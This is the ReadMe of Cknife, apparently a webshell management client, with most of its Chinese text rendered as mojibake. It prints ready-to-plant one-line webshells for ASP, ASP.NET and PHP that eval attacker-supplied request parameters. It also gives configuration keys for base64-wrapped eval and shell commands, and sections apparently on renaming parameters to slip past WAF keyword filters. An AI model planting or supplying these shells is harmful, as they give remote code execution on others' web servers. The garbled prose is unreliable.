�������ƣ�Cknife
�������ƣ�C��
Դ���ַ��https://github.com/Chora10/Cknife
���ص�ַ��http://pan.baidu.com/s/1nul1mpr  ���룺f65g
�ٷ����ͣ�http://www.ms509.com/
���ߣ�	  Chora && MelodyZX
----------------------------------------------------------------------------------------------------------
����������
�����߽����ڰ�ȫ�о����ѧʹ�ã��û�ʹ�ñ���������ɵ����к�������û��е�ȫ�����ɼ��������Σ����߲��е��κη��ɼ��������Ρ�
----------------------------------------------------------------------------------------------------------
Ϊʲô����Cknife��
1�������ѱ���Ȩ����͸������Ա������͸���ԣ�
2������WAF������������WAF�ķ���������
3���������Ա����������վ����������
----------------------------------------------------------------------------------------------------------
Ϊʲô��ԴCknife��
1����ϴ��ڵ������Ż����Ʊ�������
2���˵����Ų�������Դ�����ܴ��ڵļල�Լ���ơ�
----------------------------------------------------------------------------------------------------------
���룺ϣ�����ڰ�ȫ�о�Ա�Լ�WAF���̵ĶԿ�����������WAF�ķ���ˮƽ�Լ���ȫ�о�Ա��ʵ����
----------------------------------------------------------------------------------------------------------


һ�����л�����

��װ��JRE1.7+���������в���ϵͳ

�����ļ�˵����
------------------------------------------------------------------
Cknife.jar	Cknife������
------------------------------------------------------------------
Cknife.db	Cknife�����ݿ�(�����ڻ��Զ�����)
Config.ini	Cknife�������ļ�(�����ڻ��Զ�����)
ReadMe.txt	���������ڿ���(��ɾ��)
1.jsp		JSP����˽ű�(��ɾ��)
1.jspx		JSPX����˽ű�(��ɾ��)
------------------------------------------------------------------

����ʹ��˵����

����˽ű�֧��ASP��ASPX��PHP��JSP��JSPX��Customize(�Զ���)��
��������Ҳ��������´��루ֻҪ�ܹ��������eval�ĺ������У�����PHP��create_function��assert�ȣ�

ASP:        
<%eval request("Cknife")%>
��	
ASP.NET:    
<%@ Page Language="Jscript"%><%eval(Request.Item["Cknife"],"unsafe");%>

PHP:        
<?php @eval($_POST['Cknife']);?>

JSP:	    
[�������1.jsp]

JSPX:	    
[�������1.jspx]

Customize:  
�Զ�������,���ܴ����ڷ���˱���,������֧�����ж�̬�ű�,ֻҪ��ȷ��C�����н������ɡ���ģʽ�ɰ��趨�ƣ�����ֻҪ���Ŀ¼������ֻҪ�����ն˹��ܣ�������Ժܼ�̡�


�ġ����ݿ⹦�ܣ�

�״�ʹ�����б������Ҽ���ѡ�����ݿ��������ʾ�����������ݿ⣬����������ݿⰴťѡ���Ӧ�����ӷ�ʽ���Ӽ��ɡ�

�塢���ù��ܣ�

�������ܣ������ʹ�ѡ��������͡�֧��SOCKS��HTTP���͵Ĵ�����ʹ��BurpץȡCknife���ݣ���ѡ���������ΪHTTP�������϶�Ӧ��IP�Լ��˿ڼ��ɡ�
�����Ҫ�رմ������ܣ�ֻ��Ҫѡ���������ΪDIRECT����������û��������룬����ʾ�رմ�����

�Զ�������ͷ���ܣ����ı���������Ҫ�Զ��������ͷ�Լ���Ӧ��ֵ���������ӻ��޸Ķ������ͷ��ֻ��Ҫ�������¸�ʽ���Ӽ��ɣ�
User-Agent:xxx
Cookie:xxx
ms509:Chora
�����Ҫ�ر��Զ�������ͷ���ܣ�ֻ��Ҫ���ı���������գ�����ѡ�йر�ѡ�ȷ����

������WAF

����һ���ƽ̨�Ļ��������ļ����й��˵��������в��������û������壬������ֻ��ͼ�ε�չʾ���Լ����ݵķ��͡�
�ҷֿ���ÿһ������д�뵽�����ļ����棬�û������Զ����κδ��룬�������Ĳ������ƣ��������ݡ� 
���磺 
SKIN=javax.swing.plaf.nimbus.NimbusLookAndFeel ����Ƥ��Ϊnimbus 
SPL=->|               			       ��ʾ��ȡ���ݵĿ�ʼ���� 
SPR=|<-               			       ��ʾ��ȡ���ݵĽ������� 
CODE=code         			       ������� 
ACTION=action    			       �������� 
PARAM1=z1         			       ����1 
PARAM2=z2         			       ����2 
PHP_BASE64=1   				       ��ΪPHPʱ��Z1��Z2�����Ƿ����Զ�base64���ܣ�����붨���Լ��ļ��ܷ�ʽ��ر�����Ϊ0 
PHP_MAKE=@eval(base64_decode($_POST[action])); ���ɷ�ʽ��������Բ��ø÷�ʽ�����������κ���Ҫ�ķ�ʽ 
PHP_INDEX=...             		       ��ʾ��ҳ���ܵĴ�������
PHP_READDICT=...      			       ��ȡ��ҳ���ܵĴ�������
PHP_READFILE=...       			       ��ȡ�ļ����ܵĴ�������
PHP_DELETE=...           		       ɾ���ļ����Լ��ļ����ܵĴ�������
PHP_RENAME=...         			       �������ļ����Լ��ļ����ܵĴ�������
PHP_RETIME=...         			       �޸�ʱ�书�ܵĴ�������
PHP_NEWDICT=...        			       �½�Ŀ¼���ܵĴ�������
PHP_UPLOAD=...          		       �ϴ��ļ����ܵĴ�������
PHP_DOWNLOAD=...    			       �����ļ����ܵĴ�������
PHP_SHELL=...              		       �����ն˹��ܵĴ�������
PHP_DB_MYSQL=...			       ����MYSQL���ݿ⹦�ܵĴ�������
ASP_...=...
ASPX_...=...
JSP_...=...

�����޸����ϲ�����WAF�⣬���򻹶����ṩ��һ��Customize��WAF��ģʽ��
Customizeģʽԭ��������֧��һЩ����Ĭ�ϲ�֧�ֵĽű�������CFM��ASMX��ASHX��PY�ȵȣ�ֻҪ�û���д�Ľű�����ȷ��˵����н������ɡ�

��һ��˼����ʽ�����������дһ��PHP�ű�ʵ�������ļ��Լ�Ŀ¼�Ĺ��ܣ����ܹ���ȷ����C�����н��������ʱ���������ѡ��PHP(Eval)�����ӷ�ʽ�ͻ�����ʧ�ܡ�
Ӧ��ѡ��Customizeģʽ�������ӡ�����˵Ϊʲôһ�仰�Ϳ������ӣ���ƫƫ��Ҫд��ô�������Customizeģʽ���ӣ����һ����������WAF���eval,assert�ȹؼ���
�����һ�仰ʵ�����Ĳ��������ʱ������Բ���һ�仰������PHP�ű�������������ʵ�����ļ��Լ�Ŀ¼��Ȼ����Customizeģʽ���Ӿʹﵽ�˹�WAF��Ŀ�ġ�

Customize(�Զ���)ģʽ������ģʽһ����ÿһ������Ҳ��д�뵽�����ļ����棬�û�ͬ�����Բ��������Լ��������ݡ�
��������д����Customizeģʽ���ӵ�Customize.php����ˡ���ʾ��ҳ�����ύ�Ĳ���Ӧ���ǣ�����=1&action=index�Լ�����=1&action=readdict��
���C���ռ��Ժ�WAF���̿϶����readdict��������������ʱ����Ϳ����޸�readdict������Ϊ�������ƣ�ͬ�������޸�action�����ƣ�Ҳ�����޸�1Ϊ�����ַ�
CUS_MAKE=1 
CUS_INDEX=index 
CUS_READDICT=readdict 
CUS_READFILE=readfile 
CUS_SAVEFILE=savefile 
CUS_DELETE=delete 
CUS_RENAME=rename 
CUS_RETIME=retime 
CUS_NEWDICT=newdict 
CUS_UPLOAD=upload 
CUS_DOWNLOAD=download 
CUS_SHELL=shell

�ߡ�������־��(���°汾����ɾ��Config.ini�ļ������´��Զ������°汾��Config.ini)

������ʹ�ù����������и���BUG����ʱ��ע��һ���Ƿ��и��°ɣ�˵���������޲����ء�

��֪���⣺
Graphite��Metal���͵�Ƥ������֮���л�����Ҫ����Cknife����������(Nimbus��Windows��Mac��)��Ƥ���໥֮���л�Ҳ����Ҫ����Cknife��
�������������͵�Ƥ�������л�����Ҫ����Cknife������ȫ��Ч����Ȼ��С������󻯡��رհ�ť������ʾ������Swing�ܹ����������⡣

20160729
1���ļ������޸�����BUG
2���ļ����������޸�ʱ�书��
3���ļ������Ż�����

20160728
1�����ݿ�����޸�����BUG
2�����ݿ�������ӻ�ȡ������
3�����ݿ�����Ż�����

20160623
1�������ն������Ҽ�����ճ�����ܣ���ݼ�Ctrl+C��Ctrl+V��
2�������ն������ϼ��¼��л���ʷ�����
3�����ݿ���������Ҽ��������ݹ���

20160622
1���޸�ORACLE���ݿ�����ʧ�ܵ�����
2���޸���ĳ�ֱ���������SHELL�Ի�����������ı�����ʧ������
3������JSPX�ű�

20160620
1���޸������ն˵͸���ִ��ʧ�ܵ����
2�����ݿ���������Ż�

20160618
1�����Ӷ�HTTPSЭ���֧��
2���޸��ļ������ұ����������벻��ʾ�����

20160513
1�������Զ�������ͷ����

20160511
1����������ѡ������˴�������
2�������˶�JSPX�ű���֧�֣�����ʱ�ű�����ѡ��JSP(Eval)

20160426
1���޸�JSP����MYSQL���ݿ��쳣������
2�������ն������Զ���Cmd·���Ĺ��ܣ�����Ϊsetp [path]

20160413
1�������Զ���ģʽshell����·�����Զ���ָ���
2������JSP��MSSQL��֧��

20160318
1���Ż����棬�ұ������Ŀ¼�������Ҳ��ѡ��
2���޸�ASP��ASPX��JSP�ڴ򿪿�Ŀ¼ʱ��ʧ�ܵ�����
3����Ĭ��Ƥ��Graphite���ӵ�Ƥ���л�����
4�������ն����ӱ�ʶ�������û��ֱ�
5�����ݿⲿ�ֹ������Ӷ��߳�

20160317
1���Ż��ļ�����������Ĵ򿪷�ʽ
2���ļ��������й���ʹ�ö��̣߳���ֹ���ӳ��������Ῠ���������

20160316
1���޸���Linux��Ĭ��Ƥ����ʾ���������
2������ASPX��MSSQL��ACCESS��֧��
3������Ƥ�����ѡ�к󿴲�������

20160314
1������ASP��MSSQL��ACCESS��֧��
2���޸�����·������ʧ�ܵ�����

20160311
1���޸�ģ���ն�����BUG��
2��ģ���ն�ʹ�ö��̣߳���ֹ���ӳ��������Ῠ���������

20160310
1������JSP��MYSQL��ORACLE��֧��
2���޸���Windows�£��ļ���������һ���̷�

20160307
1������ʧ�ܷ�����ϸ��Ϣ�������û���������

20160301
1���ϲ�Cknife��Cknife_Skin
2���������ݿ⹦�ܣ�����PHP��MYSQL��֧��